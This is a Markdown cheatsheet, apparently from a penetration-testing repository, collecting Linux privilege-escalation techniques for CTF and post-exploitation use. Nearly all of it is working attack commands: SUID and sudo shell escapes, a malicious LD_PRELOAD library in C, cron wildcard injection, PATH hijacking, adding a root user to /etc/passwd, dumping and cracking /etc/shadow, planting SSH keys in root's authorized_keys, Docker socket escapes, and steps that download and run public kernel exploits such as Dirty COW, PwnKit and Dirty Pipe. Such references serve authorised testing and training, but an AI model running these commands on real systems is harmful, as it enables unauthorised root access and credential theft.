# 🐧 Linux Privilege Escalation - Complete Cheatsheet

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Complete guide to escalating privileges on Linux systems</b>
</p>

---

## 📋 Table of Contents

- [Enumeration](#-enumeration)
- [SUID/SGID](#-suidsgid)
- [Capabilities](#-capabilities)
- [Sudo Exploitation](#-sudo-exploitation)
- [Cron Jobs](#-cron-jobs)
- [PATH Hijacking](#-path-hijacking)
- [NFS Root Squashing](#-nfs-root-squashing)
- [Kernel Exploits](#-kernel-exploits)
- [Password Mining](#-password-mining)
- [SSH Keys](#-ssh-keys)
- [Writable Files](#-writable-files)
- [Docker Escape](#-docker-escape)
- [Quick Reference](#-quick-reference)

---

## 🔍 Enumeration

### System Information

```bash
# Hostname
hostname

# OS & Kernel
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Architecture
arch
uname -m

# CPU info
cat /proc/cpuinfo
lscpu
```

### User Information

```bash
# Current user
whoami
id

# All users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# User groups
groups
cat /etc/group

# Logged in users
w
who
users

# Last logged in
last
lastlog

# Sudo privileges
sudo -l
```

### Network Information

```bash
# IP addresses
ip a
ifconfig

# Routes
ip route
route -n

# Open ports
netstat -tulpn
ss -tulpn

# Active connections
netstat -an
ss -an

# ARP cache
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Hosts
cat /etc/hosts
```

### Process & Services

```bash
# Running processes
ps aux
ps -ef
ps aux | grep root

# Services
systemctl list-units --type=service
service --status-all

# Installed packages
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Scheduled Tasks

```bash
# Crontabs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Systemd timers
systemctl list-timers
```

---

## 🔐 SUID/SGID

### Find SUID Binaries

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both
find / -perm /6000 -type f 2>/dev/null
```

### Common Exploitable SUID Binaries

Check [GTFOBins](https://gtfobins.github.io/) for exploitation methods!

#### **bash**
```bash
# If bash has SUID
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (old versions)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**
```bash
# Copy /etc/passwd, add root user, copy back
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Capabilities

### Find Capabilities

```bash
# Get file capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# CAP_SETUID - change UID
# CAP_NET_RAW - raw sockets
# CAP_DAC_READ_SEARCH - read any file
```

### Exploit Capabilities

#### **Python (cap_setuid)**
```bash
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Read any file
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Sudo Exploitation

### Check Sudo Permissions

```bash
sudo -l
# Look for NOPASSWD entries
# Look for (ALL) or (root) entries
```

### Exploit Sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# If env_keep+=LD_PRELOAD in sudo -l
# Create malicious library

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (interactive)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Leaks first line of shadow
```

### Sudo Version Exploits

```bash
# Check version
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Cron Jobs

### Find Cron Jobs

```bash
# System crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
cat /var/spool/cron/crontabs/*

# Watch for cron
# Use pspy for process monitoring
```

### Exploit Cron Jobs

#### **Writable Cron Script**
```bash
# If cron runs a script you can write to:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Wait for cron, then:
/tmp/bash -p
```

#### **Wildcard Injection (tar)**
```bash
# If cron runs: tar czf /tmp/backup.tar.gz *

# Create malicious files
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **PATH Exploitation**
```bash
# If cron uses relative path and you control PATH
# Crontab shows: PATH=/home/user:/usr/local/bin:...
# Script calls: backup.sh (without full path)

# Create fake script in writable PATH dir
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

## 🛤️ PATH Hijacking

### Find Vulnerable Scripts

```bash
# Look for scripts run by root that use relative paths
# Check SUID scripts
# Check cron scripts
# Check systemd services
```

### Exploit PATH

```bash
# If root script calls 'service' without full path
# and you control PATH:

# Create malicious 'service'
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Run vulnerable script
./vulnerable_script
```

---

## 📁 NFS Root Squashing

### Find NFS Shares

```bash
# On attacker machine
showmount -e target_ip

# Check exports
cat /etc/exports
# Look for no_root_squash
```

### Exploit no_root_squash

```bash
# On attacker (as root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# On target:
/share/bash -p
```

---

## 💣 Kernel Exploits

### Check Kernel Version

```bash
uname -r
uname -a
cat /proc/version
```

### Common Kernel Exploits

| CVE | Kernel Version | Name |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | All | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Download and compile
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Download
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Check kernel version first
uname -r

# Download and compile
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🔑 Password Mining

### Search for Passwords

```bash
# In files
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Configuration files
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Environment
env
printenv
```

### Password Files

```bash
# Shadow file (need root)
cat /etc/shadow

# Password hashes from shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Common Locations

```bash
# Web configs
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Database configs
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Backup files
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🔐 SSH Keys

### Find SSH Keys

```bash
# Private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Authorized keys
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Exploit SSH Keys

```bash
# If you find a readable private key:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Add Your SSH Key

```bash
# Generate key on attacker
ssh-keygen -t rsa -b 4096

# If you can write to authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 📝 Writable Files

### Critical Writable Files

```bash
# Check write permissions
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Exploit Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt hacker password
# Result: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Add root user
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Login
su hacker
# Password: password
```

### Find World-Writable Files

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐳 Docker Escape

### Check if in Docker

```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroups
cat /proc/1/cgroup | grep docker

# Check hostname (random string)
hostname
```

### Docker Socket Mount

```bash
# If docker.sock is mounted
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Escape using docker socket
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Privileged Container

```bash
# If container is privileged
fdisk -l                    # See host disks
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Quick Reference

### One-Liner Enumeration

```bash
# Quick system info
id; hostname; uname -a; cat /etc/issue

# Quick SUID
find / -perm -4000 -type f 2>/dev/null

# Quick capabilities
getcap -r / 2>/dev/null

# Quick sudo
sudo -l

# Quick cron
cat /etc/crontab; ls -la /etc/cron*

# Quick passwords
grep -r "password" /home/ 2>/dev/null
```

### Automated Tools

| Tool | Description |
|------|-------------|
| **LinPEAS** | Comprehensive enumeration |
| **LinEnum** | Linux enumeration |
| **linux-smart-enumeration** | LSE |
| **pspy** | Process monitor |

### Quick Wins Checklist

- [ ] `sudo -l` - Check sudo permissions
- [ ] SUID binaries - Find and check GTFOBins
- [ ] Capabilities - `getcap -r / 2>/dev/null`
- [ ] Cron jobs - Writable scripts?
- [ ] Kernel version - Known exploits?
- [ ] Readable /etc/shadow
- [ ] Writable /etc/passwd
- [ ] SSH keys in /home/* or /root
- [ ] Docker socket mounted
- [ ] NFS with no_root_squash

---

## 📚 Resources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Related Cheatsheets
- [LinPEAS](../LinPEAS/README.md)
- [Windows PrivEsc](../Windows-PrivEsc/README.md)

---

<p align="center">
  <b>🐧 Get Root!</b><br>
  <i>Master Linux Privilege Escalation</i>
</p>
